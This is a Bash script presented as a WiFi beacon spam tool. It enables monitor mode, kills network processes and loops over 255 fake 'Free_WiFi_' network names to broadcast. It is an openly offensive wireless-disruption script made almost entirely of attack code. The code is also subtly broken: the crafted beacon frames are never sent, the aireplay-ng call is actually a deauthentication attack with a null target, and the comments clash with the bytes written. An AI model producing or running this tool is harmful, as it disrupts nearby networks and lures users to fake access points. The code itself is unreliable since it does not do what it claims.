#!/bin/bash

# WiFi Beacon Spam Script
# Interface configuration
INTERFACE="wlan0mon"
SSID_PREFIX="Free_WiFi_"
NUM_SSIDS=255

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print status messages
print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
    print_error "This script must be run as root"
    exit 1
fi

# Check for required tools
check_dependencies() {
    local deps=("airmon-ng" "hcxpcapngtool" "aireplay-ng")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        print_error "Missing dependencies: ${missing[*]}"
        echo "Please install:"
        echo "  - airmon-ng (from aircrack-ng package)"
        echo "  - hcxpcapngtool (from hcxtools package)"
        echo "  - aireplay-ng (from aircrack-ng package)"
        exit 1
    fi
}

# Create beacon frame
create_beacon_frame() {
    local ssid="$1"
    
    # Create temporary file for beacon frame
    local temp_file=$(mktemp)
    
    # Frame structure:
    # - Frame control (2 bytes): 0x8000 (Beacon frame)
    # - Duration (2 bytes): 0x0000
    # - Destination address (6 bytes): Broadcast (FF:FF:FF:FF:FF:FF)
    # - Source address (6 bytes): Spoofed MAC
    # - BSSID (6 bytes): Spoofed MAC
    # - Sequence control (2 bytes): 0x0000
    # - Timestamp (8 bytes): 0x0000000000000000
    # - Beacon interval (2 bytes): 0x6400 (100 TU)
    # - Capability info (2 bytes): 0x3104 (ESS+PRIVACY)
    
    # Basic frame
    printf '\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff' > "$temp_file"
    printf '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' >> "$temp_file"
    printf '\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x31\x04' >> "$temp_file"
    
    # SSID parameter set
    local ssid_len=${#ssid}
    printf "\x00$(printf '\\x%02x' $ssid_len)" >> "$temp_file"
    printf "%s" "$ssid" >> "$temp_file"
    
    # Supported rates
    printf '\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24' >> "$temp_file"
    
    # DS parameter set (channel 1)
    printf '\x03\x01\x01' >> "$temp_file"
    
    # Traffic indication map
    printf '\x05\x04\x00\x01\x00\x00' >> "$temp_file"
    
    echo "$temp_file"
}

# Cleanup function
cleanup() {
    print_status "Cleaning up..."
    
    # Remove temporary files
    rm -f /tmp/beacon_*.tmp 2>/dev/null
    
    # Stop monitor mode
    if airmon-ng stop "$INTERFACE" &>/dev/null; then
        print_status "Monitor mode stopped"
    fi
    
    # Restart network manager
    if systemctl is-active --quiet NetworkManager; then
        systemctl restart NetworkManager
        print_status "NetworkManager restarted"
    fi
}

# Set up trap for cleanup
trap cleanup EXIT

# Main execution
main() {
    print_status "Starting WiFi Beacon Spam Script"
    
    # Check dependencies
    check_dependencies
    
    print_status "Killing conflicting processes..."
    airmon-ng check kill
    
    print_status "Enabling monitor mode..."
    if ! airmon-ng start wlan0; then
        print_error "Failed to enable monitor mode"
        exit 1
    fi
    
    print_status "Starting beacon spam with $NUM_SSIDS SSIDs..."
    
    for i in $(seq 1 $NUM_SSIDS); do
        ssid="${SSID_PREFIX}${i}"
        
        # Create beacon frame
        beacon_file=$(create_beacon_frame "$ssid")
        
        # Send beacon frame using aireplay-ng
        # Note: This uses a spoofed MAC address - adjust as needed
        if aireplay-ng -0 0 -a 00:00:00:00:00:00 -h 11:22:33:44:55:66 -e "$ssid" -D "$INTERFACE" &>/dev/null; then
            print_status "Spamming SSID: $ssid"
        else
            print_warning "Failed to spam SSID: $ssid"
        fi
        
        # Clean up temporary file
        rm -f "$beacon_file"
        
        # Small delay to prevent overwhelming the interface
        sleep 0.05
    done
    
    print_status "Beacon spam completed"
}

# Execute main function
main